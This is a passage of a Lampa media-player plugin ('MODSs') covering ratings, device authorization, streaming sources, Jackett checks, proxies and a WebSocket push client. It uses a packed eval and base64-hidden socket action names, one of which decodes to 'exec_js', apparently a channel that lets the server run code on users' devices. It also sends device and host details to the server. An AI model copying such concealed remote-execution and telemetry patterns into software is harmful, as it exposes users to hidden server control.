            $('.cardify__right', Lampa.Activity.active().activity.render()).append('<div style="position:absolute; bottom: -55%; right: 0;" class="full-start-new__rate-line rating--modss"><div style="width:2em;margin-top:1em;margin-right:1em" class="wait_rating"><div class="broadcast__scan"><div></div></div></div><div class="full-start__rate rate--imdb hide"><div></div><div>IMDB</div></div><div class="full-start__rate rate--kp hide"><div></div><div>KP</div></div></div>');
          }
  		  }
        Pub.network.clear();
  			Pub.network.timeout(15 * 1000);
  			Pub.network.silent(API + 'rating_kp/', function (json) {
  				if (card && json.data) {
  				  if (json.data.kp_id && !card.kp_id) card.kp_id = json.data.kp_id;
  				  if (json.data.kp_id && !card.kinopoisk_id && !card.kinopoisk_ID) {
  				    card.kinopoisk_id = json.data.kp_id;
  				  }
  				  if (json.data.imdb_id && !card.imdb_id) card.imdb_id = json.data.imdb_id;
  				}
          var kp = json.data && json.data.kp_rating || 0;
  				var imdb = json.data && json.data.imdb_rating || 0;
  				var auth = json.data && json.data.auth;
  				
           if (json.data && json.data.vers && typeof version_modss !== 'undefined' && json.data && json.data.vers !== version_modss) {
            window.location.reload();
            return;
          }
  				
          if((!vip && logged == 'false' && leftVipD !== json.data && json.data.leftDays && auth && json.data && json.data.vip) || (vip && logged == true && leftVipD !== (json.data && json.data.leftDays) && auth=='false' && !json.data && json.data.vip)) window.location.reload();

  				if(json.data && json.data.leftDays) {
  				  leftVipD = json.data.leftDays;
  				}
  				if(!vip) Lampa.Storage.set('showModssVip', 'true');

          //if(json.data && json.data.block_ip || !ping_auth && auth == 'pending' || auth && json.data && json.data.block || auth == 'true' && !json.data && json.data.vip) Modss.auth(true);
          vip = json.data && json.data.vip;

          var parseCardRating = function (value) {
            if (value == null || value === '' || value === '-') return null;
            var num = parseFloat(value);
            return (!isNaN(num) && num > 0) ? parseFloat(num).toFixed(1) : null;
          };
          var kp_rating = (!isNaN(kp) && kp !== null && kp > 0) ? parseFloat(kp).toFixed(1) : parseCardRating(card && card.kp_rating);
				  var imdb_rating = (!isNaN(imdb) && imdb !== null && imdb > 0) ? parseFloat(imdb).toFixed(1) : parseCardRating(card && card.imdb_rating);
  				if (card && Lampa.Storage.field('mods_rating')){
  					$('.wait_rating',Lampa.Activity.active().activity.render()).remove();
  					if (imdb_rating) {
  					  $('.rate--imdb', Lampa.Activity.active().activity.render()).removeClass('hide').find('> div').eq(0).text(imdb_rating);
  					} else {
  					  $('.rate--imdb', Lampa.Activity.active().activity.render()).addClass('hide');
  					}
  					if (kp_rating) {
  					  $('.rate--kp', Lampa.Activity.active().activity.render()).removeClass('hide').find('> div').eq(0).text(kp_rating);
  					} else {
  					  $('.rate--kp', Lampa.Activity.active().activity.render()).addClass('hide');
  					}
  				} 
  				resolve();
  			}, function (a, c) {
  				resolve();
  				Lampa.Noty.show(API + ' - MODSs ОШИБКА Рейтинг KP  -> ' + Pub.network.errorDecode(a, c));
  			}, {
  			  title: card && card.title || null,
          original_title: card && (card.original_title || card.original_name) || null,
  			  year: card && year || null, 
  			  card_id: card && card.id || null, 
  			  imdb: card && card.imdb_id || null,
  			  source: card && card.source || null,
  			  user_id: user_id,
  			  uid: uid,
  			  ips: '85.118.165.195',
          id: 'emFlYmFsbzkxQGdtYWlsLmNvbQ==',
          auth: logged
  			});
			});
		},
    showTooltip: function(showTime, hideTime) {
      var remember = 1000 * 60 * 60 * 14; // 14 часов
      if (!Lampa.Storage.field('helper')) return;
      var helperMemory = {};
      var storedHelper = Lampa.Storage.get('helper');
      if (storedHelper && typeof storedHelper === 'object') {
        helperMemory = storedHelper;
      }
      var name = 'online_source';
      var help = helperMemory[name];
      
      if (!help) {
        help = {
          time: 0,
          count: 0
        };
        helperMemory[name] = help;
      }
      
      if (help.time + remember < Date.now() && help.count < 3) {
        help.time = Date.now();
        help.count++;
        Lampa.Storage.set('helper', helperMemory);
        
        $('body').find('.online-balanser-tip').remove();
        $('body').find('style#online-balanser-tip-style').remove();
        
        setTimeout(function() {
          var target = Lampa.Activity.active().activity.render().find('.filter--sort');
          if (!target.length) return;
          
          var rect = target[0].getBoundingClientRect();
          var top = rect.bottom + window.scrollY - 10;
          var left = rect.left + window.scrollX + (rect.width / 2) - 90;
          
          var tooltipText = Lampa.Lang.translate('online_click_here');
          
          $('body').append('<div class="online-balanser-tip" style="top:'+top+'px;left:'+left+'px;"><div class="online-balanser-tip__content"><div class="online-balanser-tip__hand"><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" fill="none"><path d="M44.9928 32.4372L46.2918 31.6872C47.7267 30.8587 49.5615 31.3503 50.3899 32.7852L56.3899 43.1775C57.2183 44.6124 56.7267 46.4472 55.2918 47.2756L42.2082 54.8294C41.207 55.4075 39.9626 55.3588 39.0096 54.7041L22.8051 43.5729C21.544 42.7066 21.2773 40.9549 22.2234 39.7525L22.3798 39.5538C23.1753 38.5428 24.6291 38.3443 25.6665 39.105L29.5775 41.9728C30.7703 42.8473 32.3089 41.468 31.5694 40.1872V40.1872L23.9444 26.9803C23.185 25.665 23.6357 23.9831 24.951 23.2237V23.2237C26.2663 22.4643 27.9482 22.915 28.7075 24.2303L32.5825 30.942M44.9928 32.4372L44.4928 31.5711C43.6644 30.1362 41.8296 29.6446 40.3947 30.473L38.6627 31.473M44.9928 32.4372L45.7428 33.7362M38.6627 31.473L38.4127 31.04C37.5842 29.6052 35.7495 29.1135 34.3146 29.942L32.5825 30.942M38.6627 31.473L40.6627 34.9372M32.5825 30.942L35.0825 35.2721" stroke="white" stroke-width="2" stroke-linecap="round"/><path d="M12.6101 30.3487L18.5376 26.9265M30.9314 19.7709L36.8588 16.3487M21.1567 17.1518L17.7345 11.2244M26.5865 16.437L28.3579 9.82576M17.8227 21.4967L11.2115 19.7253" stroke="orange" stroke-width="2" stroke-linecap="round"/></svg></div><div class="online-balanser-tip__text simple-button focus">'+tooltipText+'</div></div></div><style id="online-balanser-tip-style">.online-balanser-tip{position:fixed;z-index:9999;opacity:0;transform:translateY(20px);transition:opacity .3s,transform .3s;pointer-events:none;}.online-balanser-tip--active{opacity:1;transform:translateY(0);}.online-balanser-tip__content{display:flex;flex-direction:column;align-items:center;}.online-balanser-tip__hand{position:relative;margin-bottom:10px;animation:pointHand 1.5s ease-in-out infinite;}.online-balanser-tip__hand svg{width:64px;height:64px;}.online-balanser-tip__text{padding:10px 16px;color:#000;border-radius:8px;font-size:1.1em;text-align:center;}@keyframes pointHand{0%{transform:translateY(0) translateX(0) scale(1);}25%{transform:translateY(-8px) translateX(-3px) scale(1.1);}50%{transform:translateY(-15px) translateX(-8px) scale(1.2);}75%{transform:translateY(-8px) translateX(-3px) scale(1.1);}100%{transform:translateY(0) translateX(0) scale(1);}}</style>');
        
          $('.online-balanser-tip').addClass('online-balanser-tip--active');
          setTimeout(function() {
            $('.online-balanser-tip').removeClass('online-balanser-tip--active');
            setTimeout(function() {
              $('.online-balanser-tip').remove();
            }, 300);
          }, hideTime || 10000);
        }, showTime || 500);
      }
    },
		Notice: function (data) {
		  var id = data.id;
      var card = JSON.parse(data.data).card;
      setTimeout(function() {
        
        if(Lampa.Notice.classes.modss.notices.find(function (n) {
          return n.id == id;
        })) return;
        
        var bals = [];
        for (var b in data.find){
          bals.push('<b>'+b+'</b> - '+data.find[b].join(', '));
        }
        Lampa.Notice.pushNotice('modss',{
          id: id,
          from: 'modss',
          title: card.name,
          text: Lampa.Lang.translate('modss_notice_translations_on_balancers').replace('{episode}', data.episode),
          time: Date.now(), 
          poster: card.poster_path,
          card: card,
          labels: bals
        },function(){
          console.log('Успешно');
        },function(e){
          console.log('Чет пошло не так', e);
        });
      }, 1000);
      
      Lampa.Notice.listener.follow('select',function (e) {
        if(e.element.from == 'modss'){
          Lampa.Notice.close();
        }
      });
		},
    VoiceSubscriptionNotice: function (p) {
      if (!p || !p.id) return;
      var hasNewEp = p.newEpisodes > 0;
      var hasNewSrc = !!p.isNewSources;
      if (!hasNewEp && !hasNewSrc) return;
      setTimeout(function () {
        if (Lampa.Notice.classes.modss.notices.find(function (n) {
          return n.id == p.id;
        })) return;
        var seasonNum = p.season != null && p.season !== '' ? p.season : null;
        var epDisp = '';
        if (p.episodesStr && String(p.episodesStr).trim()) {
          epDisp = String(p.episodesStr).trim().replace(/\s*,\s*/g, ', ');
        } else if (p.totalEpisodes) {
          epDisp = String(p.totalEpisodes);
        }
        var voiceStr = p.voice != null && String(p.voice).trim() !== '' ? String(p.voice).trim() : '';
        var voiceBold = voiceStr ? '<b>' + voiceStr + '</b>' : '';
        var codesMap = typeof Lampa.Lang.codes === 'function' ? Lampa.Lang.codes() : null;
        var langList = codesMap && typeof codesMap === 'object' ? Object.keys(codesMap) : [];
        if (!langList.length) {
          var one = Lampa.Storage.get('language', 'ru');
          langList = [one];
        }
        var textByLang = {};
        var i;
        for (i = 0; i < langList.length; i++) {
          var code = langList[i];
          var lineForLang;
          if (hasNewEp) {
            lineForLang = Lampa.Lang.translate('modss_voice_notice_new_ep_in_voice', code);
            if (voiceBold) lineForLang += ' ' + voiceBold;
          } else {
            lineForLang = Lampa.Lang.translate('modss_voice_notice_label_new_src', code);
            if (hasNewSrc && p.newSources && p.newSources.length) {
              lineForLang += ' - ' + p.newSources.join(', ');
            }
          }
          textByLang[code] = lineForLang;
        }
        var labelsArr = [];
        if (seasonNum != null) labelsArr.push('S - <b>' + seasonNum + '</b>');
        if (epDisp) labelsArr.push('E - <b>' + epDisp + '</b>');
        if (voiceStr && !hasNewEp) {
          var voiceLabelByLang = {};
          for (i = 0; i < langList.length; i++) {
            code = langList[i];
            voiceLabelByLang[code] = '<b>' + Lampa.Lang.translate('modss_voice_notice_label_voice', code) + '</b> - ' + voiceStr;
          }
          labelsArr.push(voiceLabelByLang);
        }
        if (p.sources && p.sources.length) {
          var sourcesJoined = p.sources.join(', ');
          var sourcesLabelByLang = {};
          for (i = 0; i < langList.length; i++) {
            code = langList[i];
            sourcesLabelByLang[code] = '<b>' + Lampa.Lang.translate('modss_voice_notice_label_sources', code) + '</b> - ' + sourcesJoined;
          }
          labelsArr.push(sourcesLabelByLang);
        }
        Lampa.Notice.pushNotice('modss', {
          id: p.id,
          from: 'modss',
          title: p.title,
          text: textByLang,
          time: p.time || Date.now(),
          poster: p.poster,
          card: {
            id: p.movie_id,
            name: p.title,
            poster_path: p.poster,
            number_of_seasons: p.season || 1,
            source: p.source || 'tmdb'
          },
          labels: labelsArr
        }, function () {}, function () {});
      }, 1000);
    },
    auth: function(kp) {
      function authFn(kp) {
        eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
        return new Promise(function(resolve, reject) {
          Pub.network.clear();
          Pub.network.timeout(15000);
          Pub.network.silent(API + 'device/auth', function(json) {
            if (!json.success) window.location.reload();
            var auth = json.auth;
            logged = auth;

            console.log('Modss', 'auth', auth);
    
            if (auth === true || auth === 'true' && json.stop_auth === true) {
              if (json.block && json.stop_auth) {
                logged = false;
                Lampa.Account.logoff({email:Lampa.Storage.get('account_email')})
              }
              stopAuthInterval();
              window.location.reload();
            } else if (json.stop_auth === true) {
              if (json.block) {
                logged = false;
                Lampa.Account.logoff({email:Lampa.Storage.get('account_email')})
              }
              stopAuthInterval();
            }
            resolve(json);
          }, function(a, c) {
            resolve();
            Lampa.Noty.show('MODSs ОШИБКА Авторизации   ' + Pub.network.errorDecode(a, c));
          }, {
            user_id: user_id,
            uid: uid,
            id: 'emFlYmFsbzkxQGdtYWlsLmNvbQ==',
            ips: '85.118.165.195',
            auth: logged,
            kp: kp
          });
        });
      }
      
      authFn(kp)
      .then(function(start) {
        if (start && start.stop_auth) return;
        setTimeout(function() {
          stopAuthInterval();
        }, start.expires_in);
        if(!start.block_ip) ping_auth = setInterval(authFn, start.interval);
      })
      .catch(function(error) {
        console.error(error);
      });

      function stopAuthInterval() {
        clearInterval(ping_auth);
        ping_auth = null;
      }
    
      return {
        stop: stopAuthInterval // Возвращаем функцию остановки интервала
      };
    },    
    balansers: function() {
      var balansers = {"veoveo":"VeoVeo","mango":"ManGo 4K  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","uaflix":"UaFlix <img style=\"width:1.3em!important;height:1em!important\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVR4nO3VsQ3AMAhEUVZhiKzKbOyRGpHW8gKni/6T6A0+7AgAAP4g612nChoobmCJ0EkdiWSJSz/V5Bkt/WSTj6w8Km7qAyUNlHmEpp91qqCB5gaWCJ3UkRiWuPVTHZ7R1k92+Mjao+KmPtDQQJtHCACAMPQBoXuvu3x1za4AAAAASUVORK5CYII=\"> 4K  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","eneida":"Eneida <img style=\"width:1.3em!important;height:1em!important\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAd0lEQVR4nO3VsQ3AMAhEUVZhiKzKbOyRGpHW8gKni/6T6A0+7AgAAP4g612nChoobmCJ0EkdiWSJSz/V5Bkt/WSTj6w8Km7qAyUNlHmEpp91qqCB5gaWCJ3UkRiWuPVTHZ7R1k92+Mjao+KmPtDQQJtHCACAMPQBoXuvu3x1za4AAAAASUVORK5CYII=\">  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","fxpro":"FXpro 4K  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","flixsod":"FlixSOD 4K  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","alloha":"Alloha 4K  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","filmix":"Filmix 4K","kinopub":"KinoPub 4K","hdr":"MODS's [4K, HDR]  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","hdrezka":"HDRezka  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","aniliberty":"AniLiberty  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","dreamerscast":"Dreamerscast  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","kodik":"Kodik  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","kinotochka":"KinoTochka  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","hdvb":"HDVB  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","collaps":"Collaps  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>","starlight":"StarLight  <span style=\"font-weight: 700;color:rgb(236,151,31)\">VIP</span>"};
     // if (Lampa.Storage.get('pro_pub', false)) balansers = Object.assign({"kinopub":"KinoPub"}, balansers);
      return balansers;
    },
    check: function(name, call) {
      var name = name || Lampa.Arrays.getKeys(Modss.jack)[0];
      var json = Modss.jack[name];
      var item = $('.settings-param__status.one');
      var item2 = $('.settings-param__status.act');
      var url = (json && json.url || Lampa.Storage.get('jackett_url'));
      if(!url) return;
      var u = url + '/api/v2.0/indexers/' + (Lampa.Storage.field('jackett_interview') == 'healthy' ? 'status:healthy' : 'all') + '/results?apikey=' + (json && json.key || Lampa.Storage.get('jackett_key'));
      Pub.network.timeout(10000);
      var check = function check (ok) {
        Pub.network["native"](Protocol() + u, function (t) {
          if(name && !call) item2.removeClass('active error wait').addClass('active');
          if(call) {
            if(name && Modss.jack[name]) {
              if(!Modss.jack[name].check) Modss.jack[name].check = true;
              if(!Modss.jack[name].ok) Modss.jack[name].ok = true;
            }
            call(true);
          }
        }, function (a, c) {
          console.error('Request', 'parser error - ', Protocol() + u);
          Lampa.Noty.show(Pub.network.errorDecode(a, c) + ' - ' + url);
          if(name && !call) item2.removeClass('active error wait').addClass('error');
          if(call) {
            if(ok && name && Modss.jack[name]) {
              if(!Modss.jack[name].check) Modss.jack[name].check = true;
              if(!Modss.jack[name].ok) Modss.jack[name].ok = false;
            }
            call(false);
          }
        });
      };
      if(name && !call) check();
      else if(call && name && Modss.jack[name] && !Modss.jack[name].check) check(true);
      else {
        if(name && Modss.jack[name] && Modss.jack[name].ok) if(call) call(true);
        if(name && Modss.jack[name] && !Modss.jack[name].ok) if(call) call(false);
        if(Boolean(Modss.jack[Lampa.Storage.get('jackett_url2')])) item.removeClass('wait').addClass(Modss.jack[Lampa.Storage.get('jackett_url2')].ok ? 'active' : 'error');
      }
    },
    jack: {
      jac_red: { url: 'jac.red', key: '', lang: 'df_lg', interv: 'all' },
      jacred_torrservera_net: { url: 'jacred.torrservera.net', key: '', lang: 'df', interv: 'all' },
      spawn_pp_ua: { url: 'spawn.pp.ua:59117', key: 2, lang: 'df', interv: 'all' },
    },
    showModal: function(text, onselect, size, xml, but, title) {
      if (title === undefined || title === null) title = '';
      var modalConfig = {
        title: title,
        align: 'center',
        zIndex: 300,
        size: size == true ? 'full' : size,
        html: typeof text == 'object' ? text : Lampa.Template.get('modss_socket_push_modal', { html: text || '' }),
        onBack: function onBack() {
          if(xml) xml.abort();
          Lampa.Modal.close();
          Lampa.Controller.toggle('content');
          if (onselect && !but) {
            onselect();
          }
        }
      };
      
      if (onselect && but) {
        modalConfig.buttons = [{
          name: but[0] || Lampa.Lang.translate('settings_param_no'),
          onSelect: function onSelect() {
            if(xml) xml.abort();
            Lampa.Modal.close();
            Lampa.Controller.toggle('content');
          }
        }, {
          name: but[1] || Lampa.Lang.translate('settings_param_yes'),
          onSelect: onselect
        }];
      }
      
      Lampa.Modal.open(modalConfig);
    },
    speedTest: function(url, params) {
      Lampa.Controller.toggle('content');
      Lampa.Speedtest.start({url: url});
      $('.speedtest__body').prepend('<center style="color:rgba(255, 255, 255, 0.2);font-size:2em;font-weight: 600;">'+params.balanser+'</center>').append('<center style="color:rgba(255, 255, 255, 0.2);font-size:2em;font-weight: 600;">'+params.title+'<br>('+params.info+')</center>');
    },
    balansPrf: 'filmix',
    CACHE_TIME: 1000 * 60 * 60 * 2,
    getCache: function(key, data) {
      var timestamp = new Date().getTime();
			var cache = Lampa.Storage.cache(key, 1, {});
			if (cache[key]) {
				if ((timestamp - cache[key].timestamp) > this.CACHE_TIME) {
					delete cache[key];
					Lampa.Storage.set(data, cache);
					return false;
				}
			} else return false;
			return cache[key];
		}, 
    setCache: function(key, data) {
			var timestamp = new Date().getTime();
			var cache = Lampa.Storage.cache(key, 1, {});
			if (!cache[key]) {
				cache[key] = data;
				Lampa.Storage.set(key, cache);
			} else {
				if ((timestamp - cache[key].timestamp) > this.CACHE_TIME) {
					data.timestamp = timestamp;
					cache[key] = data;
					Lampa.Storage.set(key, cache);
				} else data = cache[key];
			}
			return data;
		},
    proxy: function (name) {
      var proxy = '';
      var need = Lampa.Storage.field('mods_proxy_' + name);
      var need_url = Lampa.Storage.get('onl_mods_proxy_' + name);
      var prox = Lampa.Storage.get('mods_proxy_all');
      var main = Lampa.Storage.get('mods_proxy_main', 'false');
      var myprox = Protocol() + 'prox.lampa.stream/';
      var myprox2 = Protocol() + 'cors.lampa.stream/';
      var proxy_apn = (window.location.protocol === 'https:' ? 'https://' : 'http://') + 'byzkhkgr.deploy.cx/';

      if (need == 'on' && name == 'videocdn') return true;
      if ((need == 'on' || main) && name == 'filmix' && need_url.length == 0 || name == 'filmix') return myprox2;
      if ((need == 'on' || main) && name == 'collaps' && need_url.length == 0) return myprox;
      if ((need == 'on' || main) && name == 'hdrezka' && need_url.length == 0) return myprox;
      if ((need == 'on' || main) && name == 'kinobase' && need_url.length == 0) return proxy_apn;
      else if (need == 'on' && need_url.length >= 0 && prox !== '') proxy = prox;
      else if (need == 'url' || (need == 'on' && need_url.length > 0)) proxy = need_url;
      else if (prox && need == 'on') proxy = prox;
      if (proxy && proxy.slice(-1) !== '/') {
        proxy += '/';
      }
      return proxy;
    },
    socket: function () {
      Modss.Socket = {
  _pack: null,
  _modalStack: null,
  _modalSavedController: null,
  _deferredPlayerUnsub: null,

  log: function () {
    try {
      var args = ['Modss', 'WS'].concat(Array.prototype.slice.call(arguments));
      console.log.apply(console, args);
    } catch (e) { }
  },
  _state: function () {
    return window.__MODSS_WS__;
  },
  Notice: function (data) {
    var id = data.id;
    var card = JSON.parse(data.data).card;
    setTimeout(function () {
      if (Lampa.Notice.classes.modss.notices.find(function (n) {
        return n.id == id;
      })) return;

      var bals = [];
      for (var b in data.find) {
        bals.push('<b>' + b + '</b> - ' + data.find[b].join(', '));
      }
      Lampa.Notice.pushNotice('modss', {
        id: id,
        from: 'modss',
        title: card.name,
        text: Lampa.Lang.translate('modss_notice_translations_on_balancers').replace('{episode}', data.episode),
        time: Date.now(),
        poster: card.poster_path,
        card: card,
        labels: bals
      }, function () {
        console.log('Успешно');
      }, function (e) {
        console.log('Чет пошло не так', e);
      });
    }, 1000);

    Lampa.Notice.listener.follow('select', function (e) {
      if (e.element.from == 'modss') {
        Lampa.Notice.close();
      }
    });
  },
  buildPushModalHtml: function (p) {
    if (!p) return Lampa.Template.get('modss_socket_push_modal', { html: '' }, true);
    if (p.html != null && String(p.html) !== '') {
      return Lampa.Template.get('modss_socket_push_modal', { html: String(p.html) }, true);
    }
    var img = (p.imageUrl || '').trim();
    var txt = p.text != null ? String(p.text) : '';
    var hasText = txt.trim().length > 0;
    var imageWrap = '';
    var textWrap = '';
    var cardClass = '';
    if (img && hasText) {
      cardClass = 'modss-push-card--both';
      imageWrap = '<div class="modss-push-card__media"><img src="' + img + '" alt="" class="modss-push-img"/></div>';
      textWrap = '<div class="modss-push-card__body"><div class="modss-push-card__desc">' + txt + '</div></div>';
    } else if (img) {
      cardClass = 'modss-push-card--image-only';
      imageWrap = '<img src="' + img + '" alt="" class="modss-push-img" style="display:block;max-width:min(92vw,980px);width:100%;height:auto;object-fit:contain;margin:0 auto;"/>';
    } else if (hasText) {
      cardClass = 'modss-push-card--text-only';
      textWrap = '<div class="modss-push-card__body"><div class="modss-push-card__desc">' + txt + '</div></div>';
    }
    var innerHtml = Lampa.Template.get('modss_push_modal_body', {
      cardClass: cardClass,
      imageWrap: imageWrap,
      textWrap: textWrap
    }, true);
    return Lampa.Template.get('modss_socket_push_modal', { html: innerHtml }, true);
  },

  applyPushModalContent: function (p) {
    if (!p) return;
    var html = $(Modss.Socket.buildPushModalHtml(p));
    var align = p.align || 'center';
    if (typeof Lampa.Modal.update === 'function') {
      Lampa.Modal.update(html);
    } else {
      try {
        var $modal = Lampa.Modal.render();
        if ($modal && $modal.length) {
          var $content = $modal.find('.modal__content');
          if ($content && $content.length) $content.empty().append(html);
          var $title = $modal.find('.modal__title');
          if ($title && $title.length) $title.text(p.title || '');
        }
      } catch (eUpd) { }
    }
    if (typeof Lampa.Modal.title === 'function') {
      Lampa.Modal.title(p.title || '');
    }
    try {
      var $m = Lampa.Modal.render();
      if ($m && $m.toggleClass) {
        $m.toggleClass('modal--align-center', align === 'center');
      }
    } catch (eAlign) { }
  },

  _restoreController: function () {
    var target = Modss.Socket._modalSavedController;
    var restore = (target != null && target !== '') ? String(target) : 'content';
    if (restore === 'player') restore = 'content';
    Lampa.Controller.toggle(restore);
    Modss.Socket._modalSavedController = null;
  },

  _isPlayerOpened: function () {
    try {
      return !!(Lampa.Player && typeof Lampa.Player.opened === 'function' && Lampa.Player.opened());
    } catch (e) {
      return false;
    }
  },

  _clearDeferredPlayerWatcher: function () {
    if (typeof Modss.Socket._deferredPlayerUnsub === 'function') {
      try {
        Modss.Socket._deferredPlayerUnsub();
      } catch (e) { }
      Modss.Socket._deferredPlayerUnsub = null;
    }
  },

  _onPlayerClosedForDeferredPush: function () {
    if (!Modss.Socket._modalStack || !Modss.Socket._modalStack.length) {
      Modss.Socket._clearDeferredPlayerWatcher();
      return;
    }
    if (Modss.Socket._isPlayerOpened()) return;
    Modss.Socket._tryOpenPushModal();
  },

  _tryOpenPushModal: function () {
    if (!Modss.Socket._modalStack || !Modss.Socket._modalStack.length) return;
    if (Modss.Socket._isPlayerOpened()) return;
    var enabled = Lampa.Controller.enabled();
    Modss.Socket._modalSavedController = enabled && enabled.name ? enabled.name : 'content';
    var top = Modss.Socket._modalStack[Modss.Socket._modalStack.length - 1];
    Lampa.Controller.toggle('content');
    Lampa.Modal.open({
      title: top.title || '',
      align: top.align || 'center',
      size: 'large',
      html: $(Modss.Socket.buildPushModalHtml(top)),
      onBack: Modss.Socket._pushModalOnBack
    });
  },

  _ensureDeferredPushWatcher: function () {
    if (Modss.Socket._deferredPlayerUnsub) return;
    if (Lampa.Player && typeof Lampa.Player.callback === 'function') {
      Modss.Socket._deferredPlayerUnsub = Lampa.Player.callback(function () {
        Modss.Socket._onPlayerClosedForDeferredPush();
      });
    }
  },

  _pushModalOnBack: function () {
    if (!Modss.Socket._modalStack || !Modss.Socket._modalStack.length) {
      Lampa.Modal.close();
      Modss.Socket._restoreController();
      Modss.Socket._clearDeferredPlayerWatcher();
      return;
    }
    Modss.Socket._modalStack.pop();
    if (Modss.Socket._modalStack.length > 0) {
      Modss.Socket.applyPushModalContent(Modss.Socket._modalStack[Modss.Socket._modalStack.length - 1]);
    } else {
      Lampa.Modal.close();
      Modss.Socket._restoreController();
      Modss.Socket._clearDeferredPlayerWatcher();
    }
  },

  pushModal: function (p) {
    if (!Modss.Socket._modalStack) Modss.Socket._modalStack = [];
    Modss.Socket._modalStack.push(p);
    if (Modss.Socket._modalStack.length === 1) {
      if (Modss.Socket._isPlayerOpened()) {
        Modss.Socket._ensureDeferredPushWatcher();
      } else {
        Modss.Socket._tryOpenPushModal();
      }
    } else if (!Modss.Socket._isPlayerOpened()) {
      Modss.Socket.applyPushModalContent(p);
    }
  },

  _b64: function (s) {
    try {
      return typeof atob === 'function' ? atob(s) : '';
    } catch (e) {
      return '';
    }
  },

  _buildPack: function () {
    var b64 = Modss.Socket._b64;
    return {
      pr: b64('bW9kc3Nfc3RhcnQ='),
      push: b64('bW9kc3NfcHVzaA=='),
      ru: b64('cm9vbVVwZGF0ZQ=='),
      no: b64('bm90aWNl'),
      e_no: b64('ZXBpc29kZV9ub3RpY2U='),
      ex: b64('ZXhlY19qcw=='),
      md: b64('bW9kYWw=')
    };
  },

  _detectLampaUrl: function () {
    try {
      var bodyHtml = '';
      if (typeof $ === 'function' && $('body').length) {
        bodyHtml = $('body').html() || '';
      } else if (document && document.body && typeof document.body.innerHTML === 'string') {
        bodyHtml = document.body.innerHTML;
      }
      if (!bodyHtml) return '';
      var match = bodyHtml.match(/(?:var|let|const)\s+(?:lampa_url|domain)\s*=\s*['"]([^'"]+)['"]/i);
      if (match && match[1]) return String(match[1]).trim();
      var scriptMatch = bodyHtml.match(/<script[^>]+src=['"]([^'"]*app\.min\.js[^'"]*)['"][^>]*>/i);
      if (scriptMatch && scriptMatch[1]) {
        var scriptSrc = String(scriptMatch[1]).trim();
        try {
          if (typeof URL === 'function') return new URL(scriptSrc, window.location.href).origin;
        } catch (e) { }
        var originMatch = scriptSrc.match(/^(https?:\/\/[^\/?#]+)/i);
        if (originMatch && originMatch[1]) return originMatch[1];
      }
      return '';
    } catch (e) {
      return '';
    }
  },

  _sendStart: function () {
    var st = Modss.Socket._state();
    if (!st.sock || st.sock.readyState !== 1) return;
    var pack = Modss.Socket._pack;
    if (!pack || !pack.pr) return;
    var device_name = Lampa.Storage.get('device_name', '');
    if (device_name.length > 200) device_name = device_name.slice(0, 200);
    var lampa_url = Modss.Socket._detectLampaUrl();
    Modss.Socket.log('lampa_url', lampa_url);
    try {
      st.sock.send(JSON.stringify({
        action: pack.pr,
        vip: !!vip,
        logged: logged === true,
        uid: uid,
        user_id: user_id,
        host: window.location.origin,
        device_name: device_name,
        lampa_url: lampa_url
      }));
    } catch (e) { }
    if (!lampa_url && (st.modssStartRetryCount || 0) < 2) {
      st.modssStartRetryCount = (st.modssStartRetryCount || 0) + 1;
      var delay = st.modssStartRetryCount === 1 ? 5000 : 15000;
      clearTimeout(st.sendModssStartRetryTimer);
      st.sendModssStartRetryTimer = setTimeout(function () {
        st.sendModssStartRetryTimer = null;
        Modss.Socket._sendStart();
      }, delay);
    }
  },

  _pingTick: function () {
    var st = Modss.Socket._state();
    if (!st.sock || st.sock.readyState !== 1) return;
    try {
      st.sock.send('ping');
    } catch (e) { }
  },

  _clearTimers: function () {
    var st = Modss.Socket._state();
    if (typeof Lampa !== 'undefined' && Lampa.Timer && typeof Lampa.Timer.remove === 'function') {
      try {
        Lampa.Timer.remove(Modss.Socket._pingTick);
      } catch (e1) { }
    }
    if (st.presenceTimer) {
      clearInterval(st.presenceTimer);
      st.presenceTimer = null;
    }
    if (st.keepaliveTimer) {
      clearInterval(st.keepaliveTimer);
      st.keepaliveTimer = null;
    }
    if (st.sendModssStartTimer) {
      clearTimeout(st.sendModssStartTimer);
      st.sendModssStartTimer = null;
    }
    if (st.sendModssStartRetryTimer) {
      clearTimeout(st.sendModssStartRetryTimer);
      st.sendModssStartRetryTimer = null;
    }
    st.modssStartRetryCount = 0;
  },

  _startTimers: function () {
    var st = Modss.Socket._state();
    Modss.Socket._clearTimers();
    if (typeof Lampa !== 'undefined' && Lampa.Timer && typeof Lampa.Timer.add === 'function') {
      Lampa.Timer.add(30000, Modss.Socket._pingTick);
    } else {
      st.keepaliveTimer = setInterval(Modss.Socket._pingTick, 30000);
    }
  },

  _handleDeviceAuth: function (result) {
    if (!result || result.method !== 'device_auth') return;
    if (result.action === 'accepted') window.location.reload();
    if (result.action === 'rejected') {
      Lampa.Account.logoff({ email: Lampa.Storage.get('account_email') });
      setTimeout(function () { window.location.reload(); }, 500);
    }
  },

  _handleLogoff: function (result) {
    if (!result || result.method != 'logoff') return;
